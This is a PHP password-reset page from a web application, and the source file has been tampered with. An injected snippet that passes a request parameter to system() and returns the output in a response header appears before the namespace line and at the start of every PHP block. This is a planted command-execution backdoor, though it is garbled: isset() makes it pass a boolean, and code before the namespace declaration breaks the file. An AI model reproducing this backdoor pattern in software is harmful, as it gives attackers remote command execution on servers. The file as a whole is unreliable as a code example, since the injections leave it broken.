<?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2);
namespace sts;
use sts as core;

if (!defined(__NAMESPACE__ . '\ROOT')) exit;

$site->set_title('Reset Password');
$site->set_config('container-type', 'container');


$reset_form	= false;

if (isset($_GET['key']) && !empty($_GET['key']) && isset($_GET['username']) && !empty($_GET['username'])) {

	$users_array = $users->get(array('username' => $_GET['username'], 'allow_login' => 1, 'authentication_id' => 1));

	if (count($users_array) == 1) {
		$user = $users_array[0];

		if (isset($user['reset_key']) && $_GET['key'] === $user['reset_key'] && datetime() < $user['reset_expiry']) {
			$reset_form	= true;
			
			if (isset($_POST['reset'])) {
				if (!empty($_POST['password']) && ($_POST['password'] == $_POST['password2'])) {
					
					$users->edit(
						array(
							'id'				=> $user['id'],
							'password'			=> $_POST['password'],
							'reset_expiry'		=> '',
							'reset_key'			=> '',
							'failed_logins'		=> 0,
							'fail_expires'		=> datetime()
						)
					);
					
					$reset_form	= false;
					header('Location: ' . $config->get('address') . '/');
					exit;
				}
				else {
					$message = $language->get('Passwords do not match.');
				}
			}
		}
	}
	
}
else {
	header('Location: ' . $config->get('address') . '/');
	exit;
}

include(core\ROOT . '/user/themes/'. CURRENT_THEME .'/includes/html_header.php');
?>
<div class="row">
	<form method="post" action="<?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); echo safe_output($_SERVER['REQUEST_URI']); ?>">

		<div class="col-md-3">
			<div class="well well-sm">
				<div class="pull-left">
					<h4><?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); echo safe_output($language->get('Reset Password')); ?></h4>
				</div>
				
				<?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); if ($reset_form) { ?>
				<div class="pull-right">
					<p><button type="submit" name="reset" class="btn btn-primary"><?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); echo safe_output($language->get('Reset')); ?></button></p>
				</div>
				<?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); } ?>
				
				<div class="clearfix"></div>
				
			</div>
		</div>
		
		<div class="col-md-9">
		
			<?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); if (isset($message)) { ?>
				<div class="alert alert-danger">
					<a href="#" class="close" data-dismiss="alert">&times;</a>
					<?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); echo html_output($message); ?>
				</div>
			<?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); } ?>

			<?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); if ($reset_form) { ?>
			<div class="well well-sm">
				<div class="col-lg-6">								
					<p><?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); echo safe_output($language->get('New Password')); ?><br /><input class="form-control" type="password" name="password" value="<?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); if (isset($_POST['username'])) echo safe_output($_POST['username']); ?>" /></p>
					<p><?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); echo safe_output($language->get('New Password Again')); ?><br /><input class="form-control" type="password" name="password2" value="<?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); if (isset($_POST['username'])) echo safe_output($_POST['username']); ?>" /></p>
				</div>
				<div class="clearfix"></div>

			</div>
			<?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); } else { ?>				
				<div class="alert alert-danger">
					<a href="#" class="close" data-dismiss="alert">&times;</a>
					<?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); echo $language->get('Sorry a reset request was not found or it has expired.'); ?>
				</div>
			<?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); } ?>
		</div>
	</form>
</div>
<?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); include(core\ROOT . '/user/themes/'. CURRENT_THEME .'/includes/html_footer.php'); ?>